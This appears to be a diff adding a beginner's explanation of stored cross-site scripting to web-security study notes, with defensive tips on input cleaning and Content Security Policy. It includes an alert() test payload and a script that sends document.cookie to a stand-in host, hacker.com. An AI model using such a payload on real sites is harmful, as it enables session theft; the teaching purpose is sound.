@@ -104,6 +104,53 @@ Since you are already logged in, the bank thinks you made the request and transf
 ✔ Ask for re-authentication (e.g., OTP or password confirmation) for sensitive actions.
 
 ---------------------------------------------------------------------------------------------------
+XSS (Cross-Site Scripting) – A Simple Explanation
+🔴 Problem: A hacker injects malicious JavaScript into a website. When someone visits that page, the script runs in their browser and can steal data or take control of their session.
+
+Imagine This Scenario:
+1️⃣ You visit a website that allows users to post comments.
+2️⃣ Normally, people write comments like:
+
+nginx
+Copy
+Edit
+Great product! 👍
+3️⃣ But a hacker writes this instead:
+
+html
+Copy
+Edit
+<script>alert("Hacked!");</script>
+4️⃣ If the website does not check inputs, it saves this as a comment in the database.
+5️⃣ Now, when someone visits the page, their browser sees this script and executes it.
+6️⃣ A pop-up appears saying:
+
+Copy
+Edit
+Hacked!
+Real-World Danger
+Instead of just a pop-up, a hacker can steal your login session (cookie) using this:
+
+html
+Copy
+Edit
+<script>
+document.location="http://hacker.com/steal?cookie=" + document.cookie;
+</script>
+✅ This sends your session ID to the hacker, allowing them to log into your account.
+
+How to Stay Safe?
+✔ Websites must clean inputs (remove <script> before saving).
+✔ Use Content Security Policy (CSP) to block harmful scripts.
+✔ Never click on suspicious links or enter details on untrusted sites.
+
+💡 In short:
+🔹 XSS injects JavaScript into websites.
+🔹 When people visit, the script runs in their browser.
+🔹 Hackers can steal login info, redirect users, or change content.
+---------------------------------------------------------------------------------------------
+
+
 
 
 
